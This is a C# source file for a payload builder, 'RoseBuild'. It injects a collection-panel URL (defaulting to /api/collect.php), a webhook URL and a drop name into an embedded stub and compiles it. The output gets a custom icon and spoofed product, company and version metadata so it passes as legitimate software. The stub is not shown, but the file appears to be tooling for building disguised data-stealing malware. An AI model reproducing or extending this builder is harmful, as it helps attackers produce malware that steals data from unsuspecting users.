using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;

namespace RoseBuild
{
    public sealed class BuildResult
    {
        public bool Success;
        public string OutputPath = "";
        public string Error = "";
        public string Log = "";
    }

    /// <summary>
    /// Turns the embedded stub source into a compiled exe: tokens replaced,
    /// assembly metadata emitted as source, icon attached by csc.
    /// </summary>
    public static class StubCompiler
    {
        private const string ResourceName = "StubTemplate.cs";

        public static BuildResult Build(BuildSpec spec, AppConfig cfg)
        {
            BuildResult result = new BuildResult();
            StringBuilder log = new StringBuilder();

            string template = ReadTemplate();
            if (template == null)
            {
                result.Error = "embedded stub template missing from this build";
                return result;
            }

            string source = template
                .Replace("%%PANEL%%", Literal(CollectUrl(spec.PanelUrl)))
                .Replace("%%WEBHOOK%%", Literal(spec.WebhookUrl))
                .Replace("%%TAG%%", Literal(spec.Tag))
                .Replace("%%APPNAME%%", Literal(string.IsNullOrEmpty(spec.ProductName) ? spec.Name : spec.ProductName))
                .Replace("%%DROP%%", Literal(spec.DropName));

            string csc = FindCompiler();
            if (csc == null)
            {
                result.Error = "csc.exe not found - .NET Framework 4.x is required to build";
                return result;
            }

            string work = Path.Combine(Path.GetTempPath(), "rose-" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(work);

            try
            {
                string sourcePath = Path.Combine(work, "Program.cs");
                File.WriteAllText(sourcePath, source, new UTF8Encoding(false));

                string infoPath = Path.Combine(work, "AssemblyInfo.cs");
                File.WriteAllText(infoPath, AssemblyInfo(spec), new UTF8Encoding(false));

                Directory.CreateDirectory(cfg.OutDir);
                string outputPath = Path.Combine(cfg.OutDir, spec.FileName);

                StringBuilder args = new StringBuilder();
                args.Append("/nologo /target:exe /platform:anycpu /optimize+ /langversion:5 /codepage:65001 ");
                args.Append("/reference:System.dll /reference:System.Core.dll /reference:System.Security.dll ");
                if (!string.IsNullOrEmpty(spec.IconPath) && File.Exists(spec.IconPath))
                    args.Append("/win32icon:\"").Append(spec.IconPath).Append("\" ");
                args.Append("/out:\"").Append(outputPath).Append("\" ");
                args.Append('"').Append(sourcePath).Append("\" ");
                args.Append('"').Append(infoPath).Append('"');

                log.AppendLine("csc " + args);
                ProcessStartInfo psi = new ProcessStartInfo(csc, args.ToString());
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;

                using (Process p = Process.Start(psi))
                {
                    string stdout = p.StandardOutput.ReadToEnd();
                    string stderr = p.StandardError.ReadToEnd();
                    p.WaitForExit(120000);

                    if (stdout.Length > 0) log.AppendLine(stdout.Trim());
                    if (stderr.Length > 0) log.AppendLine(stderr.Trim());

                    if (p.ExitCode != 0)
                    {
                        result.Error = "compiler failed (exit " + p.ExitCode + ")";
                        result.Log = log.ToString();
                        return result;
                    }
                }

                if (!File.Exists(outputPath))
                {
                    result.Error = "compiler reported success but produced no file";
                    result.Log = log.ToString();
                    return result;
                }

                log.AppendLine(VerifyMetadata(outputPath, spec));

                FileInfo info = new FileInfo(outputPath);
                log.AppendLine("built " + info.Name + " (" + info.Length.ToString("N0") + " bytes)");

                result.Success = true;
                result.OutputPath = outputPath;
                result.Log = log.ToString();
                return result;
            }
            catch (Exception ex)
            {
                result.Error = ex.Message;
                result.Log = log.ToString();
                return result;
            }
            finally
            {
                try { Directory.Delete(work, true); }
                catch { }
            }
        }

        /// <summary>Reads the compiled exe's version block back and reports what stuck.</summary>
        private static string VerifyMetadata(string path, BuildSpec spec)
        {
            try
            {
                FileVersionInfo v = FileVersionInfo.GetVersionInfo(path);
                StringBuilder sb = new StringBuilder();
                sb.Append("metadata: desc=\"").Append(v.FileDescription).Append("\"");
                sb.Append(" product=\"").Append(v.ProductName).Append("\"");
                sb.Append(" company=\"").Append(v.CompanyName).Append("\"");
                sb.Append(" file=").Append(v.FileVersion);
                sb.Append(" productver=").Append(v.ProductVersion);
                return sb.ToString();
            }
            catch (Exception ex)
            {
                return "metadata read-back failed: " + ex.Message;
            }
        }

        /// <summary>
        /// Panel URL as configured is the site root; the collector posts to
        /// /api/collect.php under it. A URL that already carries a path is
        /// used verbatim so a single endpoint can be dropped in.
        /// </summary>
        private static string CollectUrl(string panel)
        {
            if (string.IsNullOrEmpty(panel))
                return "";

            string trimmed = panel.Trim();
            while (trimmed.EndsWith("/", StringComparison.Ordinal))
                trimmed = trimmed.Substring(0, trimmed.Length - 1);

            int scheme = trimmed.IndexOf("://", StringComparison.Ordinal);
            if (scheme < 0)
                return "";

            int pathStart = trimmed.IndexOf('/', scheme + 3);
            return pathStart < 0 ? trimmed + "/api/collect.php" : trimmed;
        }

        private static string AssemblyInfo(BuildSpec spec)
        {
            string fileVersion = VersionUtil.IsValid(spec.FileVersion) ? spec.FileVersion : "1.0.0.0";
            string productVersion = VersionUtil.IsValid(spec.ProductVersion) ? spec.ProductVersion : fileVersion;

            StringBuilder sb = new StringBuilder();
            sb.AppendLine("using System.Reflection;");
            sb.AppendLine();
            sb.Append("[assembly: AssemblyTitle(").Append(LiteralStr(spec.FileDescription)).AppendLine(")]");
            sb.Append("[assembly: AssemblyProduct(").Append(LiteralStr(spec.ProductName)).AppendLine(")]");
            sb.Append("[assembly: AssemblyCompany(").Append(LiteralStr(spec.Company)).AppendLine(")]");
            sb.Append("[assembly: AssemblyCopyright(").Append(LiteralStr(spec.Copyright)).AppendLine(")]");
            sb.Append("[assembly: AssemblyVersion(").Append(LiteralStr(fileVersion)).AppendLine(")]");
            sb.Append("[assembly: AssemblyFileVersion(").Append(LiteralStr(fileVersion)).AppendLine(")]");
            sb.Append("[assembly: AssemblyInformationalVersion(").Append(LiteralStr(productVersion)).AppendLine(")]");
            sb.AppendLine("[assembly: System.Runtime.InteropServices.ComVisible(false)]");
            return sb.ToString();
        }

        private static string LiteralStr(string value)
        {
            return "\"" + Literal(value) + "\"";
        }

        private static string ReadTemplate()
        {
            Assembly asm = Assembly.GetExecutingAssembly();
            using (Stream s = asm.GetManifestResourceStream(ResourceName))
            {
                if (s == null)
                    return null;
                using (StreamReader reader = new StreamReader(s, Encoding.UTF8))
                    return reader.ReadToEnd();
            }
        }

        private static string FindCompiler()
        {
            string[] candidates = new string[]
            {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows),
                    @"Microsoft.NET\Framework64\v4.0.30319\csc.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows),
                    @"Microsoft.NET\Framework\v4.0.30319\csc.exe")
            };

            foreach (string path in candidates)
            {
                if (File.Exists(path))
                    return path;
            }
            return null;
        }

        /// <summary>Escapes a value for a C# string literal.</summary>
        private static string Literal(string value)
        {
            if (value == null)
                return "";

            StringBuilder sb = new StringBuilder(value.Length);
            foreach (char c in value)
            {
                switch (c)
                {
                    case '\\': sb.Append("\\\\"); break;
                    case '"': sb.Append("\\\""); break;
                    case '\n': sb.Append("\\n"); break;
                    case '\r': sb.Append("\\r"); break;
                    case '\t': sb.Append("\\t"); break;
                    default:
                        if (c < 0x20)
                            sb.Append("\\u").Append(((int)c).ToString("x4"));
                        else
                            sb.Append(c);
                        break;
                }
            }
            return sb.ToString();
        }
    }
}
